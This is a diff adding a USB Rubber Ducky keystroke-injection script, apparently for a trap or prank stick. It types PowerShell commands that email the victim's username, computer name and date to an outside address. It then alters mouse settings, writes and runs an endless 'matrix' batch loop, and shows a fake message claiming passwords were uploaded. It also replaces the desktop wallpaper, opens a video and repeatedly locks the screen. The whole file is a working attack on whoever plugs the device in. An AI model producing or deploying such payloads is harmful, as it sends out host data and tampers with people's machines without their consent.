@@ -1,0 +1,227 @@
+DEFAULTDELAY 20
+REM SEND MAIL!
+DELAY 2000
+GUI r
+STRING powershell
+ENTER
+DELAY 100
+STRING $Date = get-date
+ENTER
+STRING $Body = $env:Username+"@"+$env:ComputerName+"@"+$Date
+ENTER
+STRING cls
+ENTER
+STRING send-mailmessage -from "$env:Username@$env:ComputerName" -to "<alerts@jsj.de>" -subject "trapmail" -smtp mail-srv -body $Body
+ENTER
+STRING cls
+ENTER
+DELAY 400
+STRING exit
+ENTER
+REM
+
+REM SILLY MOUSE
+REM *-this is opening up the mouse config.-*
+DELAY 200
+GUI d
+CONTROL ESCAPE
+STRING maus
+DELAY 200
+ENTER
+
+REM *-makes there "busy" cursor go as slow as possible-*
+DELAY 200
+TAB
+TAB
+TAB
+TAB
+TAB
+RIGHTARROW
+RIGHTARROW
+TAB
+LEFT
+LEFT
+LEFT
+LEFT
+LEFT
+LEFT
+LEFT
+LEFT
+LEFT
+LEFT
+ENTER
+
+REM BUILD MATRIX
+DELAY 100
+GUI r
+DELAY 100
+STRING notepad
+ENTER 
+DELAY 100
+STRING @echo off
+ENTER
+ENTER
+STRING color 02 
+ENTER
+ENTER
+STRING mode 1000
+ENTER
+ENTER
+STRING :matrix
+ENTER
+ENTER
+DELAY 100
+STRING echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
+ENTER
+ENTER
+STRING goto matrix
+ENTER
+CTRL s 
+DELAY 200
+ENTER
+STRING %USERPROFILE%\matrix.cmd
+ENTER
+ALT F4
+GUI r
+STRING %USERPROFILE%\matrix.cmd
+ENTER
+DELAY 100
+WINDOWS UP
+REM
+
+REM FAKE CMD
+DELAY 200
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 200
+STRING color 2
+ENTER
+STRING dir/s
+ENTER
+DELAY 3000
+CTRL C
+STRING ECHO All passwords uploaded successfully!
+ENTER
+DELAY 2000
+STRING cls
+ENTER
+DELAY 200
+STRING B
+DELAY 100
+STRING a
+DELAY 100
+STRING d
+DELAY 100
+STRING -
+DELAY 100
+STRING USB
+DELAY 100
+STRING -
+DELAY 100
+STRING Stick!!
+DELAY 100
+STRING _-#'7rolL3D 8y C5unO'#-_
+DELAY 100
+REM
+
+REM CHANGE BG
+DELAY 300
+CONTROL ESCAPE
+DELAY 100
+STRING iexplore http://www.stickerpicker.de/images/produkte/i20/Troll-Face-Meme-204.jpg
+ENTER
+DELAY 1000
+CTRL s
+DELAY 100
+STRING %USERPROFILE%\Troll-Face-Meme-204.jpg
+DELAY 100
+ENTER
+DELAY 100
+CONTROL w
+DELAY 100
+CONTROL ESCAPE
+DELAY 100
+STRING paint
+DELAY 100
+ENTER
+DELAY 500 
+CONTROL o
+DELAY 100
+STRING %USERPROFILE%\Troll-Face-Meme-204.jpg
+ENTER
+DELAY 300 
+ALT d
+DELAY 100
+STRING r
+DELAY 100
+STRING f
+DELAY 300 
+ALT F4
+REM
+
+REM YT ROLL
+DELAY 100
+GUI r
+DELAY 100
+REM STRING iexplore.exe https://www.youtube.com/watch?v=wZZ7oFKsKzY
+STRING iexplore.exe https://www.youtube.com/watch?v=buFMeGlFIUc
+ENTER
+DELAY 200
+GUI DOWN
+DELAY 100
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+DELAY 1000
+GUI l
+REM
